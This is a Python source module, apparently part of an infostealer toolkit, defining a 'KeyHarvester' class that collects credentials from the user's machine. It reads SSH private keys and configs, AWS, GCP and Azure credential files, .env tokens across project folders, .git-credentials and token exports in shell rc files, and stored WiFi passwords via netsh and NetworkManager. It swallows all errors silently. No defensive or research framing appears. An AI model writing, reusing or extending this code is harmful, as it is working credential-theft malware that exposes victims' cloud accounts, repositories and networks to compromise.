"""
SSH key, API token, and cloud credential harvesting.

Discovers and extracts:
  - SSH private keys (~/.ssh/)
  - AWS credentials (~/.aws/credentials)
  - GCP service account keys (~/.config/gcloud/)
  - Azure tokens (~/.azure/)
  - API tokens from .env files
  - Git credential helpers
  - GPG private keys

Usage::

    from harvest.keys import KeyHarvester

    harvester = KeyHarvester()
    results = harvester.harvest_all()
"""
from __future__ import annotations

import glob
import logging
import os
import platform
import re
from dataclasses import dataclass, asdict, fields
from pathlib import Path
from typing import Any

from utils.secure_string import SecureString

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


@dataclass
class HarvestedKey:
    key_type: str         # ssh, aws, gcp, azure, env_token, git, gpg, wifi
    path: str             # file path where found
    identifier: str       # key name, AWS profile name, etc.
    content: SecureString  # the actual key/credential content
    encrypted: bool       # whether the key is passphrase-protected
    metadata: dict[str, Any] | None = None

    def to_dict(self, *, include_secrets: bool = False) -> dict[str, Any]:
        """Serialise to a plain dict.

        Parameters
        ----------
        include_secrets:
            When *False* (default), the ``content`` value is replaced with
            ``"[REDACTED]"``.  Pass *True* to include the real content.
        """
        d: dict[str, Any] = {}
        for f in fields(self):
            value = getattr(self, f.name)
            if isinstance(value, SecureString):
                d[f.name] = value.reveal() if include_secrets else "[REDACTED]"
            else:
                d[f.name] = value
        return d


class KeyHarvester:
    """Discovers and extracts keys, tokens, and credentials from the filesystem.

    Parameters
    ----------
    config : dict, optional
        Configuration options.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        self._platform = _get_platform()
        self._max_file_size = 1024 * 1024  # 1 MB max per file

    def harvest_all(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        for method in [
            self._harvest_ssh_keys,
            self._harvest_aws_credentials,
            self._harvest_gcp_credentials,
            self._harvest_azure_credentials,
            self._harvest_env_files,
            self._harvest_git_credentials,
            self._harvest_wifi_passwords,
        ]:
            try:
                results.extend(method())
            except Exception as exc:
                logger.debug("%s failed: %s", method.__name__, exc)

        return results

    # ── SSH Keys ─────────────────────────────────────────────────────

    def _harvest_ssh_keys(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        ssh_dir = Path.home() / ".ssh"
        if not ssh_dir.is_dir():
            return results

        # Common private key filenames
        key_patterns = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "*.pem", "*.key"]

        for pattern in key_patterns:
            for path in ssh_dir.glob(pattern):
                if path.is_file() and path.stat().st_size < self._max_file_size:
                    try:
                        content = path.read_text(errors="replace")
                        if "PRIVATE KEY" in content:
                            encrypted = "ENCRYPTED" in content
                            results.append(HarvestedKey(
                                key_type="ssh",
                                path=str(path),
                                identifier=path.name,
                                content=SecureString.from_plain(content),
                                encrypted=encrypted,
                            ).to_dict())
                    except Exception:
                        pass

        # Also grab known_hosts and config for intel
        for info_file in ["config", "known_hosts"]:
            info_path = ssh_dir / info_file
            if info_path.is_file() and info_path.stat().st_size < self._max_file_size:
                try:
                    results.append(HarvestedKey(
                        key_type="ssh_config",
                        path=str(info_path),
                        identifier=info_file,
                        content=SecureString.from_plain(info_path.read_text(errors="replace")),
                        encrypted=False,
                    ).to_dict())
                except Exception:
                    pass

        return results

    # ── AWS Credentials ──────────────────────────────────────────────

    def _harvest_aws_credentials(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        for filename in ["credentials", "config"]:
            aws_file = Path.home() / ".aws" / filename
            if aws_file.is_file():
                try:
                    content = aws_file.read_text(errors="replace")
                    results.append(HarvestedKey(
                        key_type="aws",
                        path=str(aws_file),
                        identifier=filename,
                        content=SecureString.from_plain(content),
                        encrypted=False,
                    ).to_dict())
                except Exception:
                    pass

        return results

    # ── GCP Credentials ──────────────────────────────────────────────

    def _harvest_gcp_credentials(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        gcp_dirs = [
            Path.home() / ".config" / "gcloud",
            Path.home() / ".config" / "gcloud" / "legacy_credentials",
        ]
        if self._platform == "windows":
            gcp_dirs.append(Path(os.environ.get("APPDATA", "")) / "gcloud")

        for gcp_dir in gcp_dirs:
            if not gcp_dir.is_dir():
                continue
            for json_file in gcp_dir.glob("**/*.json"):
                if json_file.stat().st_size < self._max_file_size:
                    try:
                        content = json_file.read_text(errors="replace")
                        if "private_key" in content or "client_secret" in content:
                            results.append(HarvestedKey(
                                key_type="gcp",
                                path=str(json_file),
                                identifier=json_file.name,
                                content=SecureString.from_plain(content),
                                encrypted=False,
                            ).to_dict())
                    except Exception:
                        pass

        # Application default credentials
        adc = Path.home() / ".config" / "gcloud" / "application_default_credentials.json"
        if adc.is_file():
            try:
                results.append(HarvestedKey(
                    key_type="gcp",
                    path=str(adc),
                    identifier="application_default_credentials",
                    content=SecureString.from_plain(adc.read_text(errors="replace")),
                    encrypted=False,
                ).to_dict())
            except Exception:
                pass

        return results

    # ── Azure Credentials ────────────────────────────────────────────

    def _harvest_azure_credentials(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        azure_dir = Path.home() / ".azure"
        if not azure_dir.is_dir():
            return results

        for json_file in azure_dir.glob("*.json"):
            if json_file.stat().st_size < self._max_file_size:
                try:
                    content = json_file.read_text(errors="replace")
                    if any(kw in content for kw in ["accessToken", "refreshToken", "client_secret"]):
                        results.append(HarvestedKey(
                            key_type="azure",
                            path=str(json_file),
                            identifier=json_file.name,
                            content=SecureString.from_plain(content),
                            encrypted=False,
                        ).to_dict())
                except Exception:
                    pass

        return results

    # ── .env Files ───────────────────────────────────────────────────

    def _harvest_env_files(self) -> list[dict[str, Any]]:
        """Scan common locations for .env files containing API tokens."""
        results: list[dict[str, Any]] = []

        search_dirs = [
            Path.home(),
            Path.home() / "Projects",
            Path.home() / "Documents",
            Path.home() / "Desktop",
            Path.home() / "code",
            Path.home() / "dev",
            Path.home() / "workspace",
        ]

        # Token-like patterns
        token_pattern = re.compile(
            r"(?:API_KEY|SECRET|TOKEN|PASSWORD|PRIVATE_KEY|ACCESS_KEY|AUTH)\s*[=:]\s*\S+",
            re.IGNORECASE,
        )

        for search_dir in search_dirs:
            if not search_dir.is_dir():
                continue
            for env_file in search_dir.glob("**/.env"):
                if env_file.stat().st_size > self._max_file_size:
                    continue
                try:
                    content = env_file.read_text(errors="replace")
                    if token_pattern.search(content):
                        results.append(HarvestedKey(
                            key_type="env_token",
                            path=str(env_file),
                            identifier=str(env_file.relative_to(Path.home())),
                            content=SecureString.from_plain(content),
                            encrypted=False,
                        ).to_dict())
                except Exception:
                    pass

        return results

    # ── Git Credentials ──────────────────────────────────────────────

    def _harvest_git_credentials(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # Git credential store (plaintext)
        git_cred = Path.home() / ".git-credentials"
        if git_cred.is_file():
            try:
                results.append(HarvestedKey(
                    key_type="git",
                    path=str(git_cred),
                    identifier=".git-credentials",
                    content=SecureString.from_plain(git_cred.read_text(errors="replace")),
                    encrypted=False,
                ).to_dict())
            except Exception:
                pass

        # GitHub/GitLab tokens in shell config
        for rc_file in [".bashrc", ".zshrc", ".bash_profile", ".profile"]:
            rc_path = Path.home() / rc_file
            if rc_path.is_file():
                try:
                    content = rc_path.read_text(errors="replace")
                    # Look for export GITHUB_TOKEN= or similar
                    token_lines = [
                        line for line in content.splitlines()
                        if any(kw in line.upper() for kw in
                               ["GITHUB_TOKEN", "GITLAB_TOKEN", "GH_TOKEN", "NPM_TOKEN"])
                        and "=" in line
                    ]
                    if token_lines:
                        results.append(HarvestedKey(
                            key_type="git",
                            path=str(rc_path),
                            identifier=rc_file,
                            content=SecureString.from_plain("\n".join(token_lines)),
                            encrypted=False,
                        ).to_dict())
                except Exception:
                    pass

        return results

    # ── WiFi Passwords ───────────────────────────────────────────────

    def _harvest_wifi_passwords(self) -> list[dict[str, Any]]:
        """Extract stored WiFi passwords (platform-specific)."""
        results: list[dict[str, Any]] = []

        if self._platform == "darwin":
            results.extend(self._wifi_macos())
        elif self._platform == "windows":
            results.extend(self._wifi_windows())
        elif self._platform == "linux":
            results.extend(self._wifi_linux())

        return results

    @staticmethod
    def _wifi_macos() -> list[dict[str, Any]]:
        """Extract WiFi passwords from macOS Keychain."""
        import subprocess

        results: list[dict[str, Any]] = []
        try:
            # List all WiFi network names
            proc = subprocess.run(
                ["networksetup", "-listpreferredwirelessnetworks", "en0"],
                capture_output=True, text=True, timeout=10,
            )
            if proc.returncode != 0:
                return results

            for line in proc.stdout.splitlines()[1:]:
                ssid = line.strip()
                if not ssid:
                    continue
                # Record the WiFi network without requesting the plaintext password
                # (the -w flag would trigger a Keychain auth dialog).
                try:
                    pw_proc = subprocess.run(
                        ["security", "find-generic-password", "-D", "AirPort network password",
                         "-s", ssid],
                        capture_output=True, text=True, timeout=10,
                    )
                    if pw_proc.returncode == 0:
                        results.append(HarvestedKey(
                            key_type="wifi",
                            path="keychain",
                            identifier=ssid,
                            content=SecureString.from_plain("[keychain-protected]"),
                            encrypted=False,
                            metadata={"ssid": ssid},
                        ).to_dict())
                except Exception:
                    pass

        except Exception:
            pass
        return results

    @staticmethod
    def _wifi_windows() -> list[dict[str, Any]]:
        """Extract WiFi passwords on Windows via netsh."""
        results: list[dict[str, Any]] = []
        try:
            import subprocess
            proc = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True, text=True, timeout=10,
            )
            if proc.returncode != 0:
                return results
            for line in proc.stdout.splitlines():
                if "All User Profile" in line or "Current User Profile" in line:
                    profile = line.split(":")[1].strip()
                    if not profile:
                        continue
                    pw_proc = subprocess.run(
                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                        capture_output=True, text=True, timeout=10,
                    )
                    if pw_proc.returncode != 0:
                        continue
                    for pw_line in pw_proc.stdout.splitlines():
                        if "Key Content" in pw_line:
                            password = pw_line.split(":")[1].strip()
                            results.append(HarvestedKey(
                                key_type="wifi",
                                path="netsh",
                                identifier=profile,
                                content=SecureString.from_plain(password),
                                encrypted=False,
                                metadata={"ssid": profile},
                            ).to_dict())
        except Exception:
            pass
        return results

    @staticmethod
    def _wifi_linux() -> list[dict[str, Any]]:
        """Extract WiFi passwords from NetworkManager configs on Linux."""
        results: list[dict[str, Any]] = []
        nm_dir = Path("/etc/NetworkManager/system-connections")
        if not nm_dir.is_dir():
            return results

        for conf_file in nm_dir.glob("*"):
            try:
                content = conf_file.read_text(errors="replace")
                if "psk=" in content:
                    ssid = conf_file.name
                    for line in content.splitlines():
                        if line.strip().startswith("psk="):
                            password = line.split("=", 1)[1].strip()
                            results.append(HarvestedKey(
                                key_type="wifi",
                                path=str(conf_file),
                                identifier=ssid,
                                content=SecureString.from_plain(password),
                                encrypted=False,
                                metadata={"ssid": ssid},
                            ).to_dict())
            except PermissionError:
                pass
            except Exception:
                pass

        return results
